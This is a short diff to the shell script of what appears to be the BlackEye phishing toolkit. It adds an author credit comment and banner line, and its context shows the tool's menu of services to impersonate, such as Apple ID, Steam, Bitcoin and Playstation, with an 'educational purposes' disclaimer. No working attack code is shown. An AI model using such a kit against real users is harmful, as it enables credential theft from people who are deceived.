@@ -2,6 +2,7 @@
 # BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
 # Coded by: @thelinuxchoice (https://github.com/thelinuxchoice/blackeye)
 # Upgraded by: @suljot_gjoka (https://github.com/whiteeagle0/blackeye)
+# Modified by Jefferson Lopes
 
 
 trap 'printf "\n";stop;exit 1' 2
@@ -34,6 +35,7 @@ printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m IGFollower
 printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
 printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Bitcoin  \e[0m                             \n"
 printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
+
 
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
@@ -218,6 +220,7 @@ printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by Bl
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
 printf "     \e[101m\e[1;77m::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::\e[0m\n"
+printf "     \e[101m\e[1;77m::                Modified by Jefferson Lopes                ::\e[0m\n"
 printf "\n"
 }
 
